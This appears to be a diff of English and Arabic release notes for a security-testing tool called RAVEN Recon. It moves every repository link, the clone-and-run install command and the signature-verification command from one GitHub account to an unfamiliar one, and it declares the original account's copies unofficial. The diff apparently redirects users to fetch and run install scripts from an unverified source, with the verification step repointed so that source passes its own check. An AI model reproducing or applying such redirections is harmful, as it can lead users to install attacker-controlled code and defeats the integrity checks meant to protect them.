@@ -1,12 +1,17 @@
-## RAVEN Recon 7.0.0 — first public release
+## RAVEN Recon 7.0.1
 
-![RAVEN Recon](https://raw.githubusercontent.com/mahmodaltory12-beep/raven-recon/main/docs/screenshots/raven-os.jpg)
+> **7.0.1** — the project moved to its permanent home **github.com/9illcodelli6-cpp69cve/raven-recon**.
+> Same features as 7.0.0; downloads are now signed under the new name, so verify with
+> `--repo 9illcodelli6-cpp69cve/raven-recon`. Bookmark this address — copies under any other
+> account are not official.
+
+![RAVEN Recon](https://raw.githubusercontent.com/9illcodelli6-cpp69cve/raven-recon/main/docs/screenshots/raven-os.jpg)
 
 **Scope-aware reconnaissance and AI-assisted security-testing workbench for bug-bounty hunters and penetration testers.**
 Runs on **Windows 10/11** and **Kali Linux / Debian / Ubuntu** — as a desktop app, a local web UI, or from the terminal.
 
 > ⚠️ **Authorised testing only.** Use RAVEN Recon only on systems you own or have written permission to test.
-> Read [RESPONSIBLE_USE.md](https://github.com/mahmodaltory12-beep/raven-recon/blob/main/RESPONSIBLE_USE.md) first.
+> Read [RESPONSIBLE_USE.md](https://github.com/9illcodelli6-cpp69cve/raven-recon/blob/main/RESPONSIBLE_USE.md) first.
 
 ### What's inside
 | Area | What you get |
@@ -30,7 +35,7 @@ Runs on **Windows 10/11** and **Kali Linux / Debian / Ubuntu** — as a desktop 
 
 Prefer installing from source (recommended on Kali — adds a menu entry plus the `raven-recon` and `raven-sec` commands):
 ```bash
-git clone https://github.com/mahmodaltory12-beep/raven-recon.git && cd raven-recon && ./install.sh
+git clone https://github.com/9illcodelli6-cpp69cve/raven-recon.git && cd raven-recon && ./install.sh
 ```
 Windows (PowerShell): `git clone … ; cd raven-recon ; powershell -ExecutionPolicy Bypass -File .\install.ps1`
 
@@ -38,7 +43,7 @@ Windows (PowerShell): `git clone … ; cd raven-recon ; powershell -ExecutionPol
 Official builds exist **only** on this Releases page. Each file is built by GitHub Actions from this repository and signed with a build-provenance attestation:
 ```bash
 sha256sum -c SHA256SUMS.txt --ignore-missing
-gh attestation verify RAVEN-Recon-linux-x64.tar.gz --repo mahmodaltory12-beep/raven-recon
+gh attestation verify RAVEN-Recon-linux-x64.tar.gz --repo 9illcodelli6-cpp69cve/raven-recon
 ```
 Copies from anywhere else ("PRO", "cracked", re-uploads) are not official and may be malicious.
 
@@ -58,7 +63,9 @@ Copies from anywhere else ("PRO", "cracked", re-uploads) are not official and ma
 
 <div dir="rtl">
 
-## RAVEN Recon 7.0.0 — أول إصدار عام
+## RAVEN Recon 7.0.1
+
+> **7.0.1** — المشروع انتقل لعنوانه الدائم **github.com/9illcodelli6-cpp69cve/raven-recon**. نفس ميزات 7.0.0، بس التواقيع صارت باسم الحساب الجديد. أي نسخة تحت حساب تاني مش رسمية.
 
 **منصة استطلاع وفحص أمني مدعومة بالذكاء الاصطناعي، بتحترم النطاق** — لصيادي الثغرات ومختبري الاختراق. بتشتغل على **ويندوز** و**كالي لينكس**: تطبيق مستقل، أو ويب محلي، أو من الترمنال.
 
@@ -68,7 +75,7 @@ Copies from anywhere else ("PRO", "cracked", re-uploads) are not official and ma
 
 **التنزيل:** ويندوز ← `RAVEN-Recon-windows-x64.zip` وشغّل `RAVEN.exe` · كالي ← `RAVEN-Recon-linux-x64.tar.gz`، أو من المصدر: `git clone … && ./install.sh`.
 
-**تحقّق من التنزيل:** النسخ الرسمية بس من هالصفحة، وكل ملف موقّع: `sha256sum -c SHA256SUMS.txt --ignore-missing` و`gh attestation verify <الملف> --repo mahmodaltory12-beep/raven-recon`. أي نسخة "PRO" أو "مكرّكة" من مكان تاني مش رسمية وممكن تكون ملغّمة.
+**تحقّق من التنزيل:** النسخ الرسمية بس من هالصفحة، وكل ملف موقّع: `sha256sum -c SHA256SUMS.txt --ignore-missing` و`gh attestation verify <الملف> --repo 9illcodelli6-cpp69cve/raven-recon`. أي نسخة "PRO" أو "مكرّكة" من مكان تاني مش رسمية وممكن تكون ملغّمة.
 
 **الذكاء الاصطناعي (اختياري):** Claude من Settings، أو موديلك المحلي المجاني عن طريق Ollama. الدليل الكامل بالعربي: README.ar.md.
 
